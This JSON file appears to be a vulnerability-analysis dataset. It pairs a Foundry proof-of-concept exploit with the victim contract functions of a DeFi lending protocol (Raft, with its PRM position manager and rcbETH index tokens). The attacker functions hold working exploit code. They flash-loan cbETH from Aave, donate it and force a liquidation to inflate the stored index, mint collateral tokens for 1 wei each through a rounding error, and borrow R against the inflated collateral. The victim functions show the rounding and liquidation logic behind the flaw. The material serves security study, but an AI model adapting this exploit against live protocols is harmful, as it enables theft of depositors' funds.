[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);\n\n        console.log(\"before infalte index, the storedIndex\", rcbETH_c.currentIndex() / 1e18);\n\n        uint256 storedindex1 = rcbETH_c.currentIndex();\n\n        uint256 rcbETH_c_HeldbyAttacker = rcbETH_c.balanceOf(address(expContract)) * 1e18 / storedindex1;\n\n        cbETH.transfer(address(PRM), cbETH.balanceOf(address(this))); // donate cbETH to PRM\n        PRM.liquidate(liquidablePosition); // liquidate position to trigger setIndex\n\n        console.log(\"after infalte index, the storedIndex\", rcbETH_c.currentIndex() / 1e18);\n\n        uint256 storedindex2 = rcbETH_c.currentIndex();\n\n        console.log(\"storedIndex magnification factor\", storedindex2 / storedindex1);\n\n        IPRM.ERC20PermitSignature memory ERC20PermitSignature =\n            IPRM.ERC20PermitSignature(address(0), uint256(0), uint256(0), uint8(0), bytes32(0), bytes32(0));\n\n        for (uint256 i; i < (60 + rcbETH_c_HeldbyAttacker); i++) {\n            PRM.managePosition(cbETH, address(this), 1, true, 0, true, 1e18, ERC20PermitSignature); // mint 1 wei rcbETH-c only using 1 wei cbETH through precision loss(rounding error)\n        }\n\n        uint256 collateralChange = cbETH.balanceOf(address(PRM));\n        PRM.managePosition(cbETH, address(this), collateralChange, false, 0, true, 1e18, ERC20PermitSignature); // redeem donate cbETH from PRM\n\n        uint256 collateralAmount = rcbETH_c.balanceOf(address(this));\n        (uint256 EtherPirce,) = RaftOracle.fetchPrice();\n        EtherPirce = EtherPirce / 1e18;\n        uint256 debtChange = collateralAmount * EtherPirce * 100 / 130 - rcbETH_d.balanceOf(address(this));\n        PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, ERC20PermitSignature); // borrow R with remaing collateral\n\n        RTocbETH(); // swap R to cbETH\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_543_485);\n        vm.label(address(aaveV3), \"aaveV3\");\n        vm.label(address(PRM), \"PRM\");\n        vm.label(address(rcbETH_c), \"rcbETH_c\");\n        vm.label(address(rcbETH_d), \"rcbETH_d\");\n        vm.label(address(R), \"R\");\n        vm.label(address(R_USDC_Pair), \"R_USDC_Pair\");\n        vm.label(address(WETH_USDC_Pair), \"WETH_USDC_Pair\");\n        vm.label(address(WETH_USDC_Pair), \"WETH_USDC_Pair\");\n        vm.label(address(RaftOracle), \"RaftOracle\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(cbETH), \"cbETH\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        deal(address(this), 0);\n        deal(address(cbETH), address(this), 1.5 ether);\n        deal(address(R), address(this), 3405 ether);\n        vm.startPrank(address(PRM));\n        rcbETH_d.mint(address(this), 3100 ether); // minimum position debt limit: 3_000 rcbETH-d\n        vm.stopPrank();\n\n        R.approve(address(PRM), type(uint256).max);\n        cbETH.approve(address(PRM), type(uint256).max);\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(cbETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 6000 ether;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        emit log_named_decimal_uint(\"Attacker R balance after exploit\", R.balanceOf(address(this)), R.decimals());\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, WETH.decimals());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (Uni_Pair_V3(msg.sender).token0() == address(R)) {\n            R.transfer(address(R_USDC_Pair), uint256(amount0Delta));\n        } else if (Uni_Pair_V3(msg.sender).token0() == address(USDC)) {\n            USDC.transfer(address(WETH_USDC_Pair), uint256(amount0Delta));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IRaftOracle",
    "source_type": "victim_contract",
    "function_name": "fetchPrice",
    "original_code": "    function fetchPrice() external override returns (uint256, uint256) {\n        IPriceOracle.PriceOracleResponse memory primaryOracleResponse = primaryOracle.getPriceOracleResponse();\n        // If primary oracle is broken or frozen, try secondary oracle\n        if (primaryOracleResponse.isBrokenOrFrozen) {\n            // If secondary oracle is broken or frozen, then both oracles are untrusted, so return the last good price\n            IPriceOracle.PriceOracleResponse memory secondaryOracleResponse = secondaryOracle.getPriceOracleResponse();\n            if (secondaryOracleResponse.isBrokenOrFrozen || secondaryOracleResponse.priceChangeAboveMax) {\n                return (lastGoodPrice, Math.max(primaryOracle.DEVIATION(), secondaryOracle.DEVIATION()));\n            }\n\n            return (_storePrice(secondaryOracleResponse.price), secondaryOracle.DEVIATION());\n        }\n\n        // If primary oracle price has changed by > MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND between two consecutive\n        // rounds, compare it to secondary oracle's price\n        if (primaryOracleResponse.priceChangeAboveMax) {\n            IPriceOracle.PriceOracleResponse memory secondaryOracleResponse = secondaryOracle.getPriceOracleResponse();\n            // If secondary oracle is broken or frozen, then both oracles are untrusted, so return the last good price\n            if (secondaryOracleResponse.isBrokenOrFrozen) {\n                return (lastGoodPrice, Math.max(primaryOracle.DEVIATION(), secondaryOracle.DEVIATION()));\n            }\n\n            /*\n            * If the secondary oracle is live and both oracles have a similar price, conclude that the primary oracle's\n            * large price deviation between two consecutive rounds were likely a legitimate market price movement, so\n            * continue using primary oracle\n            */\n            if (_bothOraclesSimilarPrice(primaryOracleResponse.price, secondaryOracleResponse.price)) {\n                return (_storePrice(primaryOracleResponse.price), primaryOracle.DEVIATION());\n            }\n\n            // If both oracle are live and have different prices, return the price that is a lower changed between the\n            // two oracle's prices\n            uint256 price = _getPriceWithLowerChange(primaryOracleResponse.price, secondaryOracleResponse.price);\n            uint256 deviation = (price == primaryOracleResponse.price)\n                ? primaryOracle.DEVIATION()\n                : (\n                    (price == secondaryOracleResponse.price)\n                        ? secondaryOracle.DEVIATION()\n                        : Math.max(primaryOracle.DEVIATION(), secondaryOracle.DEVIATION())\n                );\n            return (_storePrice(price), deviation);\n        }\n\n        // If primary oracle is working, return primary oracle current price\n        return (_storePrice(primaryOracleResponse.price), primaryOracle.DEVIATION());\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICurve",
    "source_type": "victim_contract",
    "function_name": "exchange",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPRM",
    "source_type": "victim_contract",
    "function_name": "liquidate",
    "original_code": "    function liquidate(address position) external override {\n        IERC20 collateralToken = collateralTokenForPosition[position];\n        CollateralTokenInfo storage collateralTokenInfo = collateralInfo[collateralToken];\n        IERC20Indexable raftCollateralToken = collateralTokenInfo.collateralToken;\n        IERC20Indexable raftDebtToken = collateralTokenInfo.debtToken;\n        ISplitLiquidationCollateral splitLiquidation = collateralTokenInfo.splitLiquidation;\n\n        if (address(collateralToken) == address(0)) {\n            revert NothingToLiquidate();\n        }\n        (uint256 price,) = collateralTokenInfo.priceFeed.fetchPrice();\n        uint256 entireCollateral = raftCollateralToken.balanceOf(position);\n        uint256 entireDebt = raftDebtToken.balanceOf(position);\n        uint256 icr = MathUtils._computeCR(entireCollateral, entireDebt, price);\n\n        if (icr >= splitLiquidation.MCR()) {\n            revert NothingToLiquidate();\n        }\n\n        uint256 totalDebt = raftDebtToken.totalSupply();\n        if (entireDebt == totalDebt) {\n            revert CannotLiquidateLastPosition();\n        }\n        bool isRedistribution = icr <= MathUtils._100_PERCENT;\n\n        // prettier: ignore\n        (uint256 collateralLiquidationFee, uint256 collateralToSendToLiquidator) =\n            splitLiquidation.split(entireCollateral, entireDebt, price, isRedistribution);\n\n        if (!isRedistribution) {\n            _burnRTokens(msg.sender, entireDebt);\n            totalDebt -= entireDebt;\n\n            // Collateral is sent to protocol as a fee only in case of liquidation\n            collateralToken.safeTransfer(feeRecipient, collateralLiquidationFee);\n        }\n\n        collateralToken.safeTransfer(msg.sender, collateralToSendToLiquidator);\n\n        _closePosition(raftCollateralToken, raftDebtToken, position, true);\n\n        _updateDebtAndCollateralIndex(collateralToken, raftCollateralToken, raftDebtToken, totalDebt);\n\n        emit Liquidation(\n            msg.sender,\n            position,\n            collateralToken,\n            entireDebt,\n            entireCollateral,\n            collateralToSendToLiquidator,\n            collateralLiquidationFee,\n            isRedistribution\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPRM",
    "source_type": "victim_contract",
    "function_name": "managePosition",
    "original_code": "    function managePosition(\n        IERC20 collateralToken,\n        address position,\n        uint256 collateralChange,\n        bool isCollateralIncrease,\n        uint256 debtChange,\n        bool isDebtIncrease,\n        uint256 maxFeePercentage,\n        ERC20PermitSignature calldata permitSignature\n    )\n        external\n        returns (uint256 actualCollateralChange, uint256 actualDebtChange);\n\n    /// @return The max borrowing spread.\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(address from, uint256 amount) public virtual override onlyPositionManager {\n        _burn(from, amount == type(uint256).max ? ERC20.balanceOf(from) : amount.divUp(storedIndex));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "currentIndex",
    "original_code": "    function currentIndex() public view virtual override returns (uint256) {\n        return storedIndex;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address to, uint256 amount) public virtual override onlyPositionManager {\n        _mint(to, amount.divUp(storedIndex));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20Indexable",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]